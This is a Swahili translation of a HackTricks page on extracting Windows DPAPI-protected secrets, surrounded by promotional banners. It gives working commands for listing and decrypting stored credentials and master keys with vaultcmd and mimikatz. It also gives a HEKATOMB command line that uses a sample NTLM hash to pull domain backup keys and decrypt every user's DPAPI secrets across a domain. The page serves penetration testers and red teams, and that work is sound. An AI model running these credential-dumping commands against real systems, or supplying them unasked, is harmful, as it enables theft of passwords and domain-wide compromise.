# DPAPI - Kuchimbua Maneno ya Siri

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Spain** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni sehemu ya kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila fani.

{% embed url="https://www.rootedcon.com/" %}


## Ni nini DPAPI

API ya Ulinzi wa Data (DPAPI) inatumika kwa kiasi kikubwa ndani ya mfumo wa uendeshaji wa Windows kwa **ufichaji wa usawa wa funguo za faragha zisizo sawa**, kwa kutumia siri za mtumiaji au mfumo kama chanzo kikubwa cha entropy. Njia hii inafanya ufichaji kuwa rahisi kwa watengenezaji kwa kuwawezesha kuficha data kwa kutumia funguo zilizopatikana kutoka kwa siri za kuingia za mtumiaji au, kwa ufichaji wa mfumo, siri za uwakilishi wa kikoa cha mfumo, hivyo kuondoa haja ya watengenezaji kusimamia ulinzi wa funguo za ufichaji wenyewe.

### Data Iliyolindwa na DPAPI

Miongoni mwa data binafsi iliyolindwa na DPAPI ni pamoja na:

- Maneno ya siri ya Internet Explorer na Google Chrome na data ya kujaza moja kwa moja
- Maneno ya siri ya akaunti za barua pepe na FTP za ndani kwa programu kama Outlook na Windows Mail
- Maneno ya siri kwa folda zilizoshirikiwa, rasilimali, mitandao ya wireless, na Hazina ya Windows, pamoja na funguo za ufichaji
- Maneno ya siri kwa uunganisho wa mbali wa desktop, .NET Passport, na funguo za faragha kwa madhumuni mbalimbali ya ufichaji na uwakilishi
- Maneno ya siri ya mtandao yanayosimamiwa na Meneja wa Vitambulisho na data binafsi katika programu zinazotumia CryptProtectData, kama vile Skype, MSN messenger, na zingine


## Orodha ya Hazina
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Faili za Vitambulisho

**Faili za vitambulisho zilizolindwa** zinaweza kupatikana katika:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Pata habari za siri za utambulisho kwa kutumia mimikatz `dpapi::cred`, katika jibu unaweza kupata habari muhimu kama data iliyofichwa na guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Unaweza kutumia **moduli ya mimikatz** `dpapi::cred` na `/masterkey` sahihi ili kuweza kufichua:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Vyeti vya Mwalimu

Vyeti vya DPAPI vinavyotumiwa kwa kusimbua funguo za RSA za mtumiaji huhifadhiwa chini ya saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo {SID} ni [**Kitambulisho cha Usalama**](https://en.wikipedia.org/wiki/Security\_Identifier) **cha mtumiaji huyo**. **Funguo la DPAPI limehifadhiwa katika faili ile ile inayolinda vyeti binafsi vya mtumiaji**. Kawaida, ni data ya kubahatisha ya herufi 64. (Tambua kuwa saraka hii imehifadhiwa ili usiweze kuorodhesha kwa kutumia `dir` kutoka kwa cmd, lakini unaweza kuorodhesha kutoka kwa PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Hii ndio itakavyokuwa orodha ya funguo za Mwalimu za mtumiaji:

![](<../../.gitbook/assets/image (324).png>)

Kawaida **kila funguo la mwalimu ni funguo la kisiri lililofichwa ambalo linaweza kufungua maudhui mengine**. Kwa hivyo, **kuchimbua** **Funguo la Mwalimu lililofichwa** ni muhimu ili **kufungua** baadaye **maudhui mengine** yaliyofichwa nalo.

### Chimbua funguo la mwalimu na ufungue

Angalia chapisho [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) kwa mfano wa jinsi ya kuchimba funguo la mwalimu na kufungua.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) ni uhamisho wa C# wa baadhi ya utendaji wa DPAPI kutoka kwa mradi wa [@gentilkiwi](https://twitter.com/gentilkiwi) [Mimikatz](https://github.com/gentilkiwi/mimikatz/).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni chombo kinachotumia taratibu za kiotomatiki kuchimba watumiaji na kompyuta zote kutoka kwenye saraka ya LDAP na kuchimba funguo za kuhifadhi chelezo za wadhibiti wa kikoa kupitia RPC. Kisha hati itatatua anwani za IP za kompyuta zote na kufanya smbclient kwenye kompyuta zote ili kupata vifurushi vyote vya DPAPI vya watumiaji wote na kufungua kila kitu kwa funguo za kuhifadhi chelezo za kikoa.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Kwa orodha ya kompyuta zilizochimbuliwa kutoka LDAP, unaweza kupata kila mtandao mdogo hata kama hukujua.

"Kwa sababu haki za Msimamizi wa Kikoa hazitoshi. Wadanganye wote."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kudondosha siri zilizolindwa na DPAPI kiotomatiki.

## Marejeo

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu sana la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **madhumuni ya kuendeleza maarifa ya kiufundi**, mkutano huu ni sehemu ya kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila uga.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa katika HackTricks**? Au ungependa kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
